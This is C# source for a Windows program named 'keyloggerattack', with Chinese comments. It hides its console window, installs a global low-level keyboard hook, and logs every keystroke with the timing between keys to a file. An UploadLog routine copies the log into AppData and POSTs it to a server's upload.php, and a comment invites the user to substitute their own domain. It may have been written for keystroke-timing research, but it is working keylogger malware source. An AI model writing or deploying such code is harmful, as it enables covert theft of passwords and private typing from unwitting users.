using System;
using System.Windows.Forms;

using System.Windows;
using System.Text;
using System.Linq;
//加入以下 Namespace
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.IO;
using Microsoft.Win32;
using System.Net;
using System.Threading;
using System.Reflection;

namespace keyloggerattack
{
    public class Program
    {
        // 記錄檔路徑
        //在這裡自訂記錄檔的儲存位置，例如: "C:\\log.txt"，必須加上檔案名稱和附檔名。
        


        readonly public static string logPath = @"..\..\..\keyloggerattack\Dataset\log.txt";
        // 委託 
        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        public delegate void KeyAction(int nCode, IntPtr wParam, Keys Keys);

        public static event KeyAction KeyDown;
        public static event KeyAction KeyUp;

        #region 鍵盤常數
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private static LowLevelKeyboardProc _proc = HookCallback;//下面有HookCallback函式。
        private static IntPtr _hookID = IntPtr.Zero;
        private const int SW_HIDE = 0;
        #endregion

        public static int N = 0;
        public static DateTime beforeTime;


        public static void Main()
        {
            var handle = GetConsoleWindow();//[DllImport("kernel32.dll")]
                                            //static extern IntPtr GetConsoleWindow();

            // 隱藏視窗
            ShowWindow(handle, SW_HIDE);//[DllImport("user32.dll")]
                                        //static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

            _hookID = SetHook(_proc);//下面有SetHook函式。

            Application.Run();

            // 開始鍵盤記錄
            UnhookWindowsHookEx(_hookID);
            //[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
            //[return: MarshalAs(UnmanagedType.Bool)]
             //private static extern bool UnhookWindowsHookEx(IntPtr hhk);
    }
        /// <summary>
        /// 設置鍵盤鉤子
        /// </summary>
        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc,GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        // 記錄按鍵到檔案
        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            /*
            KeyBoardHookStruct kbh = (KeyBoardHookStruct)Marshal.PtrToStructure(lParam, typeof(KeyBoardHookStruct));
            */
            int vkCode = Marshal.ReadInt32(lParam);
            if (wParam.ToInt32() == 257)
            {

                DateTime GetNowDateTimeDetail = new DateTime(0001, 01, 01, 01, 01, 01, 01);
                GetNowDateTimeDetail = DateTime.Now;

                TimeSpan ts = GetNowDateTimeDetail - beforeTime;

                int ms = (int)ts.TotalMilliseconds;
                //string strTime = "Delay " + ms.ToString();
                string strTime = ms.ToString();
                Console.WriteLine((Keys)vkCode);
                StreamWriter sw = new StreamWriter(logPath, true);
                sw.WriteLine("D" + strTime);//將時間strTime也寫入
                //sw.WriteLine("KeyUp" + " " + (Keys)vkCode);
                sw.Close();
                beforeTime = DateTime.Now;
            }
            else
            {
                //按下

                if (wParam == (IntPtr)WM_KEYDOWN)
                {
                    if (N == 0)
                    {
                        beforeTime = DateTime.Now;
                        N++;


                        DateTime GetNowDateTimeDetail = new DateTime(0001, 01, 01, 01, 01, 01, 01);
                        GetNowDateTimeDetail = DateTime.Now;
                        //string strTime = GetNowDateTimeDetail.ToString("     時間：" + "yyyy-MM-dd hh:mm:ss fff");

                        Console.WriteLine((Keys)vkCode);
                        StreamWriter sw = new StreamWriter(logPath, true);

                        //sw.WriteLine("KeyDown" + " " + (Keys)vkCode);//將時間strTime也寫入
                        sw.WriteLine("K"+(Keys)vkCode);
                        sw.Close();
                    }
                    else
                    {
                        DateTime GetNowDateTimeDetail = new DateTime(0001, 01, 01, 01, 01, 01, 01);
                        GetNowDateTimeDetail = DateTime.Now;
                        TimeSpan ts = GetNowDateTimeDetail- beforeTime;
                        int ms = (int)ts.TotalMilliseconds;
                        //string strTime = "Delay " + ms.ToString();
                        string strTime = ms.ToString();
                        Console.WriteLine((Keys)vkCode);
                        StreamWriter sw = new StreamWriter(logPath, true);

                        sw.WriteLine("I" + strTime);//將時間strTime也寫入
                        //sw.WriteLine("KeyDown" + " " + (Keys)vkCode);
                        sw.WriteLine("K"+(Keys)vkCode);
                        sw.Close();
                        beforeTime = DateTime.Now;
                    }
                }
            }
        
            
            
            /*
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                // 寫入到檔案
                int vkCode = Marshal.ReadInt32(lParam);
                //寫入時間
                DateTime GetNowDateTimeDetail = new DateTime(0001, 01, 01, 01, 01, 01, 01);
                GetNowDateTimeDetail = DateTime.Now;
                string strTime = GetNowDateTimeDetail.ToString("     時間："+"yyyy-MM-dd hh:mm:ss fff");

                Console.WriteLine((Keys)vkCode);
                StreamWriter sw = new StreamWriter(logPath, true);

                sw.WriteLine((Keys)vkCode+strTime);//將時間strTime也寫入
                sw.Close();
            }
            */
            // 由於示範的關係，我就在這裡加入了傳送記錄檔和關閉程式的程式碼
            // 當 Google Chrome (chrome.exe) 完全關閉了的時候
            // 就退出程式，並上傳記錄檔
           /* Process[] proc = Process.GetProcessesByName("chrome");
            if (proc.Length == 0)
            {
                // 傳送記錄檔
                UploadLog();
                // 關閉程式
                Environment.Exit(0);
            }*/

            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        /// <summary>
        /// 傳送記錄檔函式
        /// </summary>
        private static void UploadLog()
        {
            Random random = new Random();
            int rnd = random.Next();
            string target = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + rnd + ".txt";

            if (File.Exists(logPath))
            {
                File.Copy(logPath, target);
                try
                {
                    System.Net.WebClient Client = new System.Net.WebClient();
                    Client.Headers.Add("Content-Type", "binary/octet-stream");
                    Client.UploadFile("http://127.0.0.1/keylogger/upload.php", "POST", target); // "yourdomainname.com" 為你的伺服器的網站/IP，upload.php 為 伺服器上傳程式
                    File.Delete(logPath);
                    File.Delete(target);
                }
                catch
                {
                    File.Delete(logPath);
                    File.Delete(target);
                }
            }
        }


        void Program_KeyUp(int nCode, IntPtr wParam, Keys Keys)
        {
            if (nCode >= 0)
            {
                // 寫入到檔案
                MessageBox.Show("放開");
                //寫入時間
                DateTime GetNowDateTimeDetail = new DateTime(0001, 01, 01, 01, 01, 01, 01);
                GetNowDateTimeDetail = DateTime.Now;
                string strTime = GetNowDateTimeDetail.ToString("     時間：" + "yyyy-MM-dd hh:mm:ss fff");

                Console.WriteLine(Keys.ToString());
                StreamWriter sw = new StreamWriter(logPath, true);

                sw.WriteLine("鬆開.."+ Keys.ToString() + strTime);//將時間strTime也寫入
                sw.Close();
            }
        }

        void Program_KeyDown(int nCode, IntPtr wParam, Keys Keys)
        {
            if (nCode >= 0)
            {
                // 寫入到檔案
                //寫入時間
                MessageBox.Show("按下");
                DateTime GetNowDateTimeDetail = new DateTime(0001, 01, 01, 01, 01, 01, 01);
                GetNowDateTimeDetail = DateTime.Now;
                string strTime = GetNowDateTimeDetail.ToString("     時間：" + "yyyy-MM-dd hh:mm:ss fff");

                Console.WriteLine(Keys.ToString());
                StreamWriter sw = new StreamWriter(logPath, true);

                sw.WriteLine("按下.."+ Keys.ToString() + strTime);//將時間strTime也寫入
                sw.Close();
            }
        }

       /* public static int square(DateTime n)
        {

            return 
        }*/

        #region 鍵盤鉤子API
        //設置掛鉤
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook,LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        //將之前的掛鉤移除
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        //呼叫下一個掛鉤處理常式(若不這麼做，會令其他掛鉤處理常式失敗)
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        
        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();
        #endregion
    }
}
